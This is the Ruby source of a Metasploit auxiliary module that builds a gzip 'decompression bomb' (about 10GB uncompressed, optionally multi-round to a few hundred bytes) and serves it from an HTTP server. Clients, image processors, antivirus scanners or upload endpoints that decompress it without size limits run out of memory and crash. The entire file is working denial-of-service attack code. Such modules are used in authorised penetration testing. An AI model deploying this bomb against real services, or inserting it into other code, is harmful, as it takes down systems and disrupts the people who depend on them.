##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zlib'
require 'stringio'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gzip Memory Bomb Denial Of Service',
        'Description' => %q{
          This module generates and hosts a 10MB single-round gzip file that decompresses to 10GB.
          Many applications will not implement a length limit check and will eat up all memory and
          eventually die. This can also be used to kill systems that download/parse content from
          a user-provided URL (image-processing servers, AV, websites that accept zipped POST data, etc).

          A FILEPATH datastore option can also be provided to save the .gz bomb locally.

          Some clients (Firefox) will allow for multiple rounds of gzip. Most gzip utils will correctly
          deflate multiple rounds of gzip on a file. Setting ROUNDS=3 and SIZE=10240 (default value)
          will generate a 300 byte gzipped file that expands to 10GB.
        },
        'Author' => [
          'info[at]aerasec.de', # 2004 gzip bomb advisory
          'joev' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'http://www.aerasec.de/security/advisories/decompression-bomb-vulnerability.html' ]
        ],
        'DisclosureDate' => '2004-01-01',
        'Actions' => [
          [ 'WebServer', { 'Description' => 'Host file via web server' } ]
        ],
        'PassiveActions' => [
          'WebServer'
        ],
        'DefaultAction' => 'WebServer',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptInt.new('SIZE', [true, 'Size of uncompressed data in megabytes (10GB default).', 10240]),
        OptInt.new('ROUNDS', [true, 'Rounds of gzip compression. Some applications (FF) support > 1.', 1]),
        OptString.new('URIPATH', [false, 'Path of URI on server to the gzip bomb (default is random)']),
        OptString.new('CONTENT_TYPE', [false, 'Content-Type header to serve in the response', 'text/html'])
      ]
    )
  end

  def run
    datastore['HTTP::compression'] = false # not a good idea
    @gzip = generate_gzip
    print_status "Gzip generated. Uncompressed=#{default_size}bytes. Compressed=#{@gzip.length}bytes."
    exploit # start http server
  end

  def on_request_uri(cli, _request)
    print_status "Sending gzipped payload to client #{cli.peerhost}"
    rounds = (['gzip'] * datastore['ROUNDS']).join(', ')
    send_response(cli, @gzip, { 'Content-Encoding' => rounds, 'Content-Type' => datastore['CONTENT_TYPE'] })
  end

  # zlib ftw
  def generate_gzip(size = default_size, blocks = nil, reps = nil)
    reps ||= datastore['ROUNDS']
    return blocks if reps < 1

    print_status 'Generating gzip bomb...'
    StringIO.open do |io|
      stream = Zlib::GzipWriter.new(io, Zlib::BEST_COMPRESSION, Zlib::DEFAULT_STRATEGY)
      buf = nil
      begin
        # add MB of data to the stream. this takes a little while, but doesn't kill memory.
        if blocks.nil?
          chunklen = 1024 * 1024 * 8 # 8mb per chunk
          a = 'A' * chunklen
          n = size / chunklen

          n.times do |i|
            stream << a
            if i % 100 == 0
              print_status "#{i.to_s.rjust(Math.log(n, 10).ceil)}/#{n} chunks added (#{'%.1f' % (i.to_f / n.to_f * 100)}%)"
            end
          end
        else
          stream << blocks
        end

        a = nil # gc a
        buf = generate_gzip(size, io.string, reps - 1)
      ensure
        stream.flush
        stream.close
      end
      buf
    end
  end

  def default_size
    datastore['SIZE'] * 1024 * 1024 # mb -> bytes
  end
end
